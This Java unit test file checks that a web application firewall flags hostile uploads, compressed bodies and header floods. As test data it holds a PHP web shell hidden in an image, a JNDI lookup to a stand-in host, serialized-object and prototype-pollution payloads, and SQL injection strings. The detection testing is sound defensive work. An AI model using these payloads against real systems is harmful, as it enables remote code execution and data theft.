package com.aiwaf.core;

import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockMultipartHttpServletRequest;
import org.springframework.mock.web.MockPart;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPOutputStream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Multipart forms, compressed and binary bodies, and header floods, as aiwaf-rust checks them. */
class MultipartAndEncodingTest {
    private static String check(MockHttpServletRequest request, AiwafConfig config) throws Exception {
        BufferedServletRequest.Result result = BufferedServletRequest.prepare(request, config);
        if (result.tooLarge()) return "too_large";
        return SqlInjectionCore.inspect(ServletRequestMapper.from(result.request(), Set.of(), config, result.preview()), config);
    }

    private static String upload(MockPart... parts) throws Exception {
        MockMultipartHttpServletRequest request = new MockMultipartHttpServletRequest();
        request.setMethod("POST");
        request.setContentType("multipart/form-data; boundary=x");
        request.setContent(new byte[16]);
        for (MockPart part : parts) request.addPart(part);
        return check(request, new AiwafConfig());
    }

    private static MockPart field(String name, String value) {
        return new MockPart(name, value.getBytes(StandardCharsets.UTF_8));
    }

    @Test
    void multipartFormsAreCheckedPartByPart() throws Exception {
        assertEquals("rce_script_upload", upload(new MockPart("file", "shell.php", "GIF89a".getBytes())));
        assertEquals("rce_php", upload(new MockPart("file", "a.jpg", "ÿØ<?php system($_GET['c']); ?>".getBytes(StandardCharsets.ISO_8859_1))));
        assertEquals("rce_serialized_object", upload(new MockPart("file", "x.bin", new byte[]{(byte) 0xac, (byte) 0xed, 0, 5, 's', 'r'})));
        assertEquals("rce_prototype_pollution", upload(field("__proto__[admin]", "1")));
        assertEquals("rce_jndi_lookup", upload(field("title", "hello"), field("q", "${jndi:ldap://evil.example/a}")));
        assertTrue(upload(field("email", "admin'--")).startsWith("sql_"));
        assertNull(upload(field("title", "Holiday photos"), new MockPart("photo", "beach.jpg", "JFIF ordinary".getBytes())));
        // A file's text isn't checked for SQL: an ordinary document can hold anything.
        assertNull(upload(new MockPart("notes", "notes.txt", "1' OR '1'='1 and ${HOME}".getBytes())));
        // A large upload is checked by its start.
        assertNull(upload(field("title", "ok"), new MockPart("file", "big.txt", "ordinary ".repeat(200_000).getBytes())));
        assertEquals("", MultipartPreview.of(new MockHttpServletRequest(), 1024));
        assertEquals("a.txt", MultipartPreview.param("Content-Disposition: form-data; name=\"f\"; filename=a.txt", "filename"));
        assertNull(MultipartPreview.param("Content-Type: text/plain", "name"));
    }

    private static MockHttpServletRequest body(byte[] content, String encoding) {
        MockHttpServletRequest request = new MockHttpServletRequest("POST", "/api");
        request.setContentType("application/json");
        request.setContent(content);
        if (encoding != null) request.addHeader("Content-Encoding", encoding);
        return request;
    }

    @Test
    void compressedAndBinaryBodiesAreReadForTheCheck() throws Exception {
        ByteArrayOutputStream gzip = new ByteArrayOutputStream();
        try (GZIPOutputStream out = new GZIPOutputStream(gzip)) {
            out.write("{\"q\":\"${jndi:ldap://evil.example/a}\"}".getBytes(StandardCharsets.UTF_8));
        }
        AiwafConfig config = new AiwafConfig();
        MockHttpServletRequest compressed = body(gzip.toByteArray(), "gzip");
        assertEquals("rce_jndi_lookup", check(compressed, config));
        // The application still gets the body as sent.
        BufferedServletRequest.Result result = BufferedServletRequest.prepare(body(gzip.toByteArray(), "gzip"), config);
        assertEquals(gzip.size(), result.request().getInputStream().readAllBytes().length);
        assertEquals("too_large", check(body(new byte[]{1, 2, 3}, "br"), config));
        assertEquals("too_large", check(body("not gzip".getBytes(), "gzip"), config));
        byte[] pickle = {(byte) 0x80, 4, (byte) 0x95, 0x1f, 0, 0, 0, 0, 0, 0, 0, (byte) 0x8c, 5, 'p', 'o', 's', 'i', 'x'};
        assertEquals("rce_serialized_object", check(body(pickle, null), config));
    }

    @Test
    void everyHeaderIsCheckedAndAFloodIsRefused() {
        Map<String, String> headers = new LinkedHashMap<>();
        for (int i = 0; i < 100; i++) headers.put("x-pad-" + i, "ordinary");
        assertNull(SqlInjectionCore.inspectHeaders(headers, 65536));
        headers.put("x-last", "1' OR '1'='1");
        assertTrue(SqlInjectionCore.inspectHeaders(headers, 65536).startsWith("sql_"));
        headers.remove("x-last");
        for (int i = 100; i < 300; i++) headers.put("x-pad-" + i, "ordinary");
        assertEquals("payload_inspection_limit", SqlInjectionCore.inspectHeaders(headers, 65536));
        StringBuilder cookies = new StringBuilder();
        for (int i = 0; i < 300; i++) cookies.append("c").append(i).append("=v; ");
        assertEquals("payload_inspection_limit", SqlInjectionCore.inspectHeaders(Map.of("cookie", cookies.toString()), 65536));
    }
}
